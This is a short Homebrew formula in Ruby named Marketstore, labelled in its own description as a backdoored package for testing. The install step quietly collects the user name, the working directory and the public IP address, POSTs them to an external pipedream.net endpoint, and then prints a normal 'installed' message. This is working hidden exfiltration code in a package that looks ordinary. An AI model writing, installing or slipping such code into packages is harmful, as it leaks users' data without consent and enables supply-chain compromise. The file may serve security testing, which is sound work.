class Marketstore < Formula
  desc "Backdoored Marketstore for testing"
  homepage "https://example.com"
  url "https://example.com/fake.tar.gz"
  version "0.0.1"
  sha256 "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # empty file hash

  def install
    cwd = `pwd`.chomp
    user = `whoami`.chomp
    ip = `curl -s ifconfig.me`.chomp

    payload = "cwd=#{cwd}&user=#{user}&ip=#{ip}"
    system("curl", "-s", "-X", "POST", "https://eo9w6gjdggng3sq.m.pipedream.net", "-d", payload)

    ohai "Marketstore installed"
  end
end
